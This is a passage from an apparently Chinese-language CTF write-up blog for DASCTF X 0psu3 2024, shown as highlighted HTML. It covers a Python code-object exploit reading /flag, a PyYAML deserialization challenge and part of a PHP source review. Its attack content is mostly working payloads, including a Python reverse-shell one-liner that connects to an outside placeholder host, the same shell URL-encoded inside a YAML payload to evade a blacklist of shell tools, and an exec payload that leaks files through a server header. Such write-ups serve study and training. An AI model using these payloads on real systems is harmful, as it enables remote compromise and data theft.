punctuation">(</span>g2<span class="token punctuation">,</span><span class="token string">"co_argcount"</span><span class="token punctuation">)</span><span class="token comment"># g4 = getattr(g2,"co_posonlyargcount") 因为会ban os字符串，于是用 co_argcount 代替</span>g4 <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>g2<span class="token punctuation">,</span><span class="token string">"co_argcount"</span><span class="token punctuation">)</span>g5 <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>g2<span class="token punctuation">,</span><span class="token string">"co_kwonlyargcount"</span><span class="token punctuation">)</span>g6 <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>g2<span class="token punctuation">,</span><span class="token string">"co_nlocals"</span><span class="token punctuation">)</span>g7 <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>g2<span class="token punctuation">,</span><span class="token string">"co_stacksize"</span><span class="token punctuation">)</span>g8 <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>g2<span class="token punctuation">,</span><span class="token string">"co_flags"</span><span class="token punctuation">)</span>g9 <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>g2<span class="token punctuation">,</span><span class="token string">"co_code"</span><span class="token punctuation">)</span>g10 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token string">'/flag'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">,</span> <span class="token string">'utf-8'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">'encoding'</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># g10 = getattr(g2,"co_consts")</span>g11 <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>g2<span class="token punctuation">,</span><span class="token string">"co_names"</span><span class="token punctuation">)</span>g12 <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>g2<span class="token punctuation">,</span><span class="token string">"co_varnames"</span><span class="token punctuation">)</span>g13 <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>g2<span class="token punctuation">,</span><span class="token string">"co_filename"</span><span class="token punctuation">)</span>g14 <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>g2<span class="token punctuation">,</span><span class="token string">"co_name"</span><span class="token punctuation">)</span>g15 <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>g2<span class="token punctuation">,</span><span class="token string">"co_firstlineno"</span><span class="token punctuation">)</span>g16 <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>g2<span class="token punctuation">,</span><span class="token string">"co_lnotab"</span><span class="token punctuation">)</span>g17 <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>g2<span class="token punctuation">,</span><span class="token string">"co_freevars"</span><span class="token punctuation">)</span>g18 <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>g2<span class="token punctuation">,</span><span class="token string">"co_cellvars"</span><span class="token punctuation">)</span>g19 <span class="token operator">=</span> CodeType<span class="token punctuation">(</span>g3<span class="token punctuation">,</span>g4<span class="token punctuation">,</span>g5<span class="token punctuation">,</span>g6<span class="token punctuation">,</span>g7<span class="token punctuation">,</span>g8<span class="token punctuation">,</span>g9<span class="token punctuation">,</span>g10<span class="token punctuation">,</span>g11<span class="token punctuation">,</span>g12<span class="token punctuation">,</span>g13<span class="token punctuation">,</span>g14<span class="token punctuation">,</span>g15<span class="token punctuation">,</span>g16<span class="token punctuation">,</span>g17<span class="token punctuation">,</span>g18<span class="token punctuation">)</span>g20 <span class="token operator">=</span> <span class="token builtin">setattr</span>g20<span class="token punctuation">(</span>src<span class="token punctuation">,</span><span class="token string">"__code__"</span><span class="token punctuation">,</span>g19<span class="token punctuation">)</span><span class="token keyword">return</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="yaml-matser（复现）"><a href="#yaml-matser（复现）" class="headerlink" title="yaml_matser（复现）"></a>yaml_matser（复现）</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os<span class="token keyword">import</span> re<span class="token keyword">import</span> yaml<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> jsonify<span class="token punctuation">,</span> render_templateapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">,</span> template_folder<span class="token operator">=</span><span class="token string">'templates'</span><span class="token punctuation">)</span>UPLOAD_FOLDER <span class="token operator">=</span> <span class="token string">'uploads'</span>os<span class="token punctuation">.</span>makedirs<span class="token punctuation">(</span>UPLOAD_FOLDER<span class="token punctuation">,</span> exist_ok<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">waf</span><span class="token punctuation">(</span>input_str<span class="token punctuation">)</span><span class="token punctuation">:</span>    blacklist_terms <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'apply'</span><span class="token punctuation">,</span> <span class="token string">'subprocess'</span><span class="token punctuation">,</span><span class="token string">'os'</span><span class="token punctuation">,</span><span class="token string">'map'</span><span class="token punctuation">,</span> <span class="token string">'system'</span><span class="token punctuation">,</span> <span class="token string">'popen'</span><span class="token punctuation">,</span> <span class="token string">'eval'</span><span class="token punctuation">,</span> <span class="token string">'sleep'</span><span class="token punctuation">,</span> <span class="token string">'setstate'</span><span class="token punctuation">,</span>                       <span class="token string">'command'</span><span class="token punctuation">,</span><span class="token string">'static'</span><span class="token punctuation">,</span><span class="token string">'templates'</span><span class="token punctuation">,</span><span class="token string">'session'</span><span class="token punctuation">,</span><span class="token string">'&amp;'</span><span class="token punctuation">,</span><span class="token string">'globals'</span><span class="token punctuation">,</span><span class="token string">'builtins'</span>                       <span class="token string">'run'</span><span class="token punctuation">,</span> <span class="token string">'ntimeit'</span><span class="token punctuation">,</span> <span class="token string">'bash'</span><span class="token punctuation">,</span> <span class="token string">'zsh'</span><span class="token punctuation">,</span> <span class="token string">'sh'</span><span class="token punctuation">,</span> <span class="token string">'curl'</span><span class="token punctuation">,</span> <span class="token string">'nc'</span><span class="token punctuation">,</span> <span class="token string">'env'</span><span class="token punctuation">,</span> <span class="token string">'before_request'</span><span class="token punctuation">,</span> <span class="token string">'after_request'</span><span class="token punctuation">,</span>                       <span class="token string">'error_handler'</span><span class="token punctuation">,</span> <span class="token string">'add_url_rule'</span><span class="token punctuation">,</span><span class="token string">'teardown_request'</span><span class="token punctuation">,</span><span class="token string">'teardown_appcontext'</span><span class="token punctuation">,</span><span class="token string">'\\u'</span><span class="token punctuation">,</span><span class="token string">'\\x'</span><span class="token punctuation">,</span><span class="token string">'+'</span><span class="token punctuation">,</span><span class="token string">'base64'</span><span class="token punctuation">,</span><span class="token string">'join'</span><span class="token punctuation">&#125;</span>    input_str_lower <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>input_str<span class="token punctuation">)</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> term <span class="token keyword">in</span> blacklist_terms<span class="token punctuation">:</span>        <span class="token keyword">if</span> term <span class="token keyword">in</span> input_str_lower<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Found blacklisted term: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>term<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">return</span> <span class="token boolean">False</span>file_pattern <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">r'.*\.yaml$'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">is_yaml_file</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token builtin">bool</span><span class="token punctuation">(</span>file_pattern<span class="token punctuation">.</span><span class="token keyword">match</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token triple-quoted-string string">'''    Welcome to DASCTF X 0psu3    &lt;br>    Here is the challenge &lt;a href="/upload">Upload file&lt;/a>    &lt;br>    Enjoy it &lt;a href="/Yam1">Yam1&lt;/a>    '''</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/upload'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">upload_file</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            uploaded_file <span class="token operator">=</span> request<span class="token punctuation">.</span>files<span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span>            <span class="token keyword">if</span> uploaded_file <span class="token keyword">and</span> is_yaml_file<span class="token punctuation">(</span>uploaded_file<span class="token punctuation">.</span>filename<span class="token punctuation">)</span><span class="token punctuation">:</span>                file_path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>UPLOAD_FOLDER<span class="token punctuation">,</span> uploaded_file<span class="token punctuation">.</span>filename<span class="token punctuation">)</span>                uploaded_file<span class="token punctuation">.</span>save<span class="token punctuation">(</span>file_path<span class="token punctuation">)</span>                <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"uploaded successfully"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">200</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"error"</span><span class="token punctuation">:</span> <span class="token string">"Just YAML file"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">400</span>        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"error"</span><span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">500</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'upload.html'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/Yam1'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">Yam1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    filename <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'filename'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> filename<span class="token punctuation">:</span>        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'uploads/</span><span class="token interpolation"><span class="token punctuation">&#123;</span>filename<span class="token punctuation">&#125;</span></span><span class="token string">.yaml'</span></span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>            file_content <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> waf<span class="token punctuation">(</span>file_content<span class="token punctuation">)</span><span class="token punctuation">:</span>            test <span class="token operator">=</span> yaml<span class="token punctuation">.</span>load<span class="token punctuation">(</span>file_content<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>test<span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token string">'welcome'</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>很明显是打 pyyaml 反序列化，版本肯定是漏洞版本的，只需要考虑绕 waf 即可</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">blacklist_terms <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'apply'</span><span class="token punctuation">,</span> <span class="token string">'subprocess'</span><span class="token punctuation">,</span><span class="token string">'os'</span><span class="token punctuation">,</span><span class="token string">'map'</span><span class="token punctuation">,</span> <span class="token string">'system'</span><span class="token punctuation">,</span> <span class="token string">'popen'</span><span class="token punctuation">,</span> <span class="token string">'eval'</span><span class="token punctuation">,</span> <span class="token string">'sleep'</span><span class="token punctuation">,</span> <span class="token string">'setstate'</span><span class="token punctuation">,</span>                       <span class="token string">'command'</span><span class="token punctuation">,</span><span class="token string">'static'</span><span class="token punctuation">,</span><span class="token string">'templates'</span><span class="token punctuation">,</span><span class="token string">'session'</span><span class="token punctuation">,</span><span class="token string">'&amp;'</span><span class="token punctuation">,</span><span class="token string">'globals'</span><span class="token punctuation">,</span><span class="token string">'builtins'</span>                       <span class="token string">'run'</span><span class="token punctuation">,</span> <span class="token string">'ntimeit'</span><span class="token punctuation">,</span> <span class="token string">'bash'</span><span class="token punctuation">,</span> <span class="token string">'zsh'</span><span class="token punctuation">,</span> <span class="token string">'sh'</span><span class="token punctuation">,</span> <span class="token string">'curl'</span><span class="token punctuation">,</span> <span class="token string">'nc'</span><span class="token punctuation">,</span> <span class="token string">'env'</span><span class="token punctuation">,</span> <span class="token string">'before_request'</span><span class="token punctuation">,</span> <span class="token string">'after_request'</span><span class="token punctuation">,</span>                       <span class="token string">'error_handler'</span><span class="token punctuation">,</span> <span class="token string">'add_url_rule'</span><span class="token punctuation">,</span><span class="token string">'teardown_request'</span><span class="token punctuation">,</span><span class="token string">'teardown_appcontext'</span><span class="token punctuation">,</span><span class="token string">'\\u'</span><span class="token punctuation">,</span><span class="token string">'\\x'</span><span class="token punctuation">,</span><span class="token string">'+'</span><span class="token punctuation">,</span><span class="token string">'base64'</span><span class="token punctuation">,</span><span class="token string">'join'</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="非预期-1"><a href="#非预期-1" class="headerlink" title="非预期"></a>非预期</h2><p>ban了很多，但是忘了url编码</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">__import__</span><span class="token punctuation">(</span><span class="token string">'os'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'python3 -c \'import os,pty,socket;s=socket.socket();s.connect(("xxx.xxx.xxx.xxx",7777));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")\''</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>直接打一个 extend 触发即可</p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token tag">!!python/object/new:type</span><span class="token key atrule">args</span><span class="token punctuation">:</span>  <span class="token punctuation">-</span> exp  <span class="token punctuation">-</span> <span class="token tag">!!python/tuple</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>  <span class="token punctuation">-</span> <span class="token punctuation">&#123;</span><span class="token key atrule">"extend"</span><span class="token punctuation">:</span> <span class="token tag">!!python/name:exec</span> <span class="token punctuation">&#125;</span><span class="token key atrule">listitems</span><span class="token punctuation">:</span> <span class="token string">"import urllib; exec(urllib.parse.unquote('%5f%5f%69%6d%70%6f%72%74%5f%5f%28%27%6f%73%27%29%2e%73%79%73%74%65%6d%28%27%70%79%74%68%6f%6e%33%20%2d%63%20%5c%27%69%6d%70%6f%72%74%20%6f%73%2c%70%74%79%2c%73%6f%63%6b%65%74%3b%73%3d%73%6f%63%6b%65%74%2e%73%6f%63%6b%65%74%28%29%3b%73%2e%63%6f%6e%6e%65%63%74%28%28%22%31%31%31%2e%78%78%78%2e%78%78%78%2e%31%35%39%22%2c%37%37%37%37%29%29%3b%5b%6f%73%2e%64%75%70%32%28%73%2e%66%69%6c%65%6e%6f%28%29%2c%66%29%66%6f%72%20%66%20%69%6e%28%30%2c%31%2c%32%29%5d%3b%70%74%79%2e%73%70%61%77%6e%28%22%73%68%22%29%5c%27%27%29'))"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="预期-1"><a href="#预期-1" class="headerlink" title="预期"></a>预期</h2><p>之前 <a href="https://c1oudfl0w0.github.io/blog/2024/09/28/SCTF-2024/#%E9%A2%84%E6%9C%9F%EF%BC%9AWSGI%E5%B8%A6%E5%87%BA%E5%9B%9E%E6%98%BE">sctf</a> 提过在 wsgi 头带出回显的操作，这次就是利用这一手操作实现回显</p><p>修改 WSGIRequestHandler 对象 server_version 的值</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> werkzeug<span class="token builtin">setattr</span><span class="token punctuation">(</span>werkzeug<span class="token punctuation">.</span>serving<span class="token punctuation">.</span>WSGIRequestHandler<span class="token punctuation">,</span> <span class="token string">"server_version"</span><span class="token punctuation">,</span><span class="token string">'想要带出的数据'</span> <span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>构造yaml：</p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token tag">!!python/object/new:type</span>        <span class="token key atrule">args</span><span class="token punctuation">:</span>         <span class="token punctuation">-</span> exp         <span class="token punctuation">-</span> <span class="token tag">!!python/tuple</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>         <span class="token punctuation">-</span> <span class="token punctuation">&#123;</span><span class="token key atrule">"extend"</span><span class="token punctuation">:</span> <span class="token tag">!!python/name:exec</span> <span class="token punctuation">&#125;</span>        <span class="token key atrule">listitems</span><span class="token punctuation">:</span> <span class="token punctuation">|</span><span class="token scalar string">         bb=open("/flag").read()         import werkzeug         setattr(werkzeug.serving.WSGIRequestHandler, "server_version",bb )</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2024/12/21/DASCTF-x-0psu3-2024%E6%9C%80%E5%90%8E%E4%B8%80%E6%88%98/image-20250122001931230.png" alt="image-20250122001931230"></p><hr><h1 id="strange-php（复现）"><a href="#strange-php（复现）" class="headerlink" title="strange_php（复现）"></a>strange_php（复现）</h1><p>审一下源码，看一下主要逻辑</p><p>welcome.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'action'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$action</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'action'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$action</span><span class="token punctuation">;</span>    <span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token variable">$action</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">case</span> <span class="token string single-quoted-string">'message'</span><span class="token punctuation">:</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"write messageing"</span><span class="token punctuation">;</span>            <span class="token variable">$decodedMessage</span> <span class="token operator">=</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'encodedMessage'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token variable">$userMessage</span><span class="token operator">-></span><span class="token function">writeMessage</span><span class="token punctuation">(</span><span class="token variable">$decodedMessage</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$msg</span><span class="token operator">===</span><span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token keyword">echo</span> <span class="token string double-quoted-string">"写入失败"</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token variable">$filePath</span> <span class="token operator">=</span> <span class="token variable">$userMessage</span><span class="token operator">-></span><span class="token function">get_filePath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'message_path'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$filePath</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"留言已写入: "</span><span class="token operator">.</span> <span class="token variable">$userMessage</span><span class="token operator">-></span><span class="token function">get_filePath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token string single-quoted-string">'editMessage'</span><span class="token punctuation">:</span>                <span class="token variable">$decodedEditMessage</span> <span class="token operator">=</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'encodedEditMessage'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'message_path'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token variable">$userMessage</span><span class="token operator">-></span><span class="token function">editMessage</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'message_path'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$decodedEditMessage</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$msg</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"留言已成功更改"</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token keyword">else</span><span class="token punctuation">&#123;</span>                    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"操作失败，请重新尝试"</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string single-quoted-string">'delete'</span><span class="token punctuation">:</span>            <span class="token variable">$message</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'message_path'</span><span class="token punctuation">]</span><span class="token operator">?</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'message_path'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'message_path'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token variable">$userMessage</span><span class="token operator">-></span><span class="token function">deleteMessage</span><span class="token punctuation">(</span><span class="token variable">$message</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$msg</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token keyword">echo</span> <span class="token string double-quoted-string">"留言已成功删除"</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">else</span><span class="token punctuation">&#123;</span>                <span class="token keyword">echo</span> <span class="token string double-quoted-string">"操作失败，请重新尝试"</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token string single-quoted-string">'clean'</span><span class="token punctuation">:</span>                <span class="token function">exec</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'rm log/*'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">exec</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'rm txt/*'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>能写入或删除任意txt，并且写入路径可知</p><p>跟进一下相关功能的函数</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">writeMessage</span><span class="token punctuation">(</span><span class="token variable">$message</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// 写入留言到文件中</span>    <span class="token variable">$a</span><span class="token operator">=</span> <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filePath</span><span class="token punctuation">,</span> <span class="token variable">$message</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token operator">===</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">deleteMessage</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$path</span> <span class="token operator">=</span> <span class="token variable">$path</span><span class="token operator">.</span><span class="token string double-quoted-string">".txt"</span><span class="token punctuation">;</span>    <span class="token comment">// 删除留言文件</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$msg</span> <span class="token operator">===</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" 